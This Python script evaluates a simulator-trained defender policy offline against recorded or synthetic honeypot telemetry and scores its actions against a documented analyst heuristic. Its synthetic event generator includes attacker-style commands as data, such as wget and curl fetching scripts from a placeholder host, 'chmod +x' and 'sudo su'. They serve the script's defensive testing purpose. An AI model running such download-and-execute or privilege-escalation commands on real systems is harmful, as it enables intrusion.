"""
shadow_eval.py  –  Offline shadow-mode evaluation of the trained defender
==========================================================================
Phase-D (realism / grounding) result for the paper. Replays a recorded
honeypot telemetry window through the simulator-trained defender policy
(DefenderAdvisor) and reports:

  * the defender's action distribution over real events, and
  * how often its recommendation agrees with a simple, documented SOC-analyst
    heuristic (exact match + "reasonable" match).

This is the practical-relevance experiment the Defender Copilot productionises.
Integrity note (mirrors PROJECT_CONTEXT.md §15): this is a controlled shadow
evaluation, NOT a calibrated, deployment-ready defender — the heuristic is a
proxy for analyst ground truth, not a labelled dataset.

Inputs (pick one):
  --events PATH    a JSON list of Elasticsearch `_source` objects (a recorded
                   honeypot window), or {"hits": {"hits": [{"_source": ...}]}}
  --es-url URL     query a live Elasticsearch instead (default off)
  --synthetic N    generate N synthetic events for a runnable smoke / scaffold

Usage:
  venv/Scripts/python.exe src/server/rl/shadow_eval.py --synthetic 400 \
      --out ../../../public/rl-artifacts/shadow_eval.json
  venv/Scripts/python.exe src/server/rl/shadow_eval.py --events window.json
"""

import argparse
import json
import os
import random
from collections import Counter
from typing import Dict, List, Optional

DEF_ACTION_NAMES = [
    "monitor", "investigate", "rate_limit", "deploy_decoy", "threat_hunt",
    "isolate_host", "hard_block", "patch_harden", "rotate_credentials",
    "restore_backup", "raise_alert", "deception_response",
]

# Actions a reasonable analyst could justifiably take for a given situation.
REASONABLE = {
    "creds":   {"isolate_host", "rotate_credentials", "hard_block", "threat_hunt"},
    "exfil":   {"investigate", "isolate_host", "hard_block", "rate_limit"},
    "brute":   {"rate_limit", "hard_block", "monitor", "raise_alert"},
    "scan":    {"threat_hunt", "monitor", "investigate", "deploy_decoy"},
    "noise":   {"monitor", "investigate"},
    "quiet":   {"monitor", "deploy_decoy"},
}


def analyst_heuristic(summary: Dict[str, float]) -> str:
    """A deliberately simple, documented SOC-analyst rule used as a proxy for
    ground truth. Returns the single 'expected' action; REASONABLE gives the
    acceptable set for the 'reasonable agreement' metric."""
    if summary["priv_esc_attempts"] > 0:
        return "isolate_host"               # privilege escalation → contain
    if summary["downloads"] > 0:
        return "investigate"                # tooling pulled down → dig in
    if summary["failed_logins"] >= 20:
        return "rate_limit"                 # brute force → throttle
    if summary["port_scan"]:
        return "threat_hunt"                # recon → hunt
    if summary["failed_logins"] >= 5:
        return "monitor"
    return "monitor"


def situation(summary: Dict[str, float]) -> str:
    if summary["priv_esc_attempts"] > 0:
        return "creds"
    if summary["downloads"] > 0:
        return "exfil"
    if summary["failed_logins"] >= 20:
        return "brute"
    if summary["port_scan"]:
        return "scan"
    if summary["failed_logins"] >= 5:
        return "noise"
    return "quiet"


def load_events(args) -> List[dict]:
    if args.synthetic:
        return _synthetic_events(args.synthetic)
    if args.events:
        with open(args.events) as f:
            raw = json.load(f)
        if isinstance(raw, dict):
            return raw.get("hits", {}).get("hits", raw.get("events", []))
        return raw
    if args.es_url:
        from telemetry_adapter import TelemetryAdapter
        return TelemetryAdapter(es_url=args.es_url, window=args.window).fetch_events()
    raise SystemExit("provide --events, --es-url, or --synthetic")


def _synthetic_events(n: int) -> List[dict]:
    """Generate a labelled-feel honeypot window for a runnable scaffold. Clearly
    synthetic — for smoke-testing the pipeline and producing a sample artifact."""
    rng = random.Random(7)
    ips = [f"185.220.10.{i}" for i in range(1, 6)]
    out: List[dict] = []
    for i in range(n):
        ip = rng.choice(ips)
        roll = rng.random()
        if roll < 0.55:
            ev = {"eventid": "cowrie.login.failed", "src_ip": ip,
                  "session": f"s{i % 40}"}
        elif roll < 0.75:
            cmd = rng.choice(["nmap -sS 10.0.0.0/24", "wget http://x/y.sh",
                              "sudo su", "chmod +x ./m", "curl -O http://x/z"])
            ev = {"eventid": "cowrie.command.input", "src_ip": ip,
                  "input": cmd, "session": f"s{i % 40}"}
        elif roll < 0.85:
            ev = {"eventid": "cowrie.session.file_download", "src_ip": ip,
                  "session": f"s{i % 40}"}
        else:
            ev = {"eventid": "cowrie.session.connect", "src_ip": ip,
                  "session": f"s{i % 40}"}
        out.append({"_source": ev})
    return out


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--events", help="JSON file of recorded ES events")
    parser.add_argument("--es-url", help="query a live Elasticsearch instead")
    parser.add_argument("--window", default="now-1h")
    parser.add_argument("--synthetic", type=int, default=0,
                        help="generate N synthetic events (scaffold/smoke)")
    parser.add_argument("--window-size", type=int, default=20,
                        help="events per shadow window")
    parser.add_argument("--model", help="defender .zip (default: best/latest)")
    parser.add_argument("--out", help="write the JSON report here")
    args = parser.parse_args()

    import numpy as np  # noqa: PLC0415
    from telemetry_adapter import DefenderAdvisor, TelemetryAdapter  # noqa: PLC0415
    from shared_honeypot_env import defender_observation  # noqa: PLC0415

    model_path = args.model
    if model_path is None:
        for cand in ("./models/cyberx_marl/results/run_four_a/defender_best.zip",
                     "./models/cyberx_marl/defender_latest.zip"):
            if os.path.exists(cand):
                model_path = cand
                break
    if not model_path or not os.path.exists(model_path):
        raise SystemExit("no defender model found — pass --model")

    advisor = DefenderAdvisor(model_path)
    events = load_events(args)
    if not events:
        raise SystemExit("no events to evaluate")

    actions: Counter = Counter()
    n_windows = exact = reasonable = 0
    rows = []

    for start in range(0, len(events), args.window_size):
        window = events[start:start + args.window_size]
        summary = TelemetryAdapter.summarize(window)
        anomalies = (summary["suspicious_commands"] + summary["port_scan"]
                     + summary["priv_esc_attempts"])
        obs = defender_observation(
            observed_anomalies=anomalies, evidence=0.0,
            failed_logins=summary["failed_logins"], step_fraction=0.5,
            egress_volume=summary["downloads"], alerts=0, decoys_deployed=0,
            decoy_tripped=False, containment_active=False,
            hosts_anomalous=summary["n_src_ips"],
            credential_anomaly=summary["priv_esc_attempts"] > 0,
            rate_limited=False)
        rl_action = advisor.suggest(obs)["action_name"]
        expected = analyst_heuristic(summary)
        ok_set = REASONABLE[situation(summary)]

        actions[rl_action] += 1
        n_windows += 1
        exact += int(rl_action == expected)
        reasonable += int(rl_action in ok_set)
        rows.append({"summary": summary, "rl_action": rl_action,
                     "expected": expected, "reasonable": rl_action in ok_set})

    report = {
        "model": model_path,
        "n_events": len(events),
        "n_windows": n_windows,
        "window_size": args.window_size,
        "action_distribution": {a: actions.get(a, 0) for a in DEF_ACTION_NAMES},
        "exact_agreement": round(exact / n_windows, 3),
        "reasonable_agreement": round(reasonable / n_windows, 3),
        "synthetic": bool(args.synthetic),
        "note": ("Shadow-mode eval: trained-in-sim defender over honeypot "
                 "telemetry vs a documented analyst heuristic (proxy ground "
                 "truth). Controlled evaluation, not a deployment claim."),
        "rows": rows[:50],
    }

    print(f"windows={n_windows}  exact={report['exact_agreement']}  "
          f"reasonable={report['reasonable_agreement']}")
    print("action distribution:",
          {a: c for a, c in actions.most_common()})

    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        with open(args.out, "w") as f:
            json.dump(report, f, indent=2)
        print(f"wrote {args.out}")


if __name__ == "__main__":
    main()
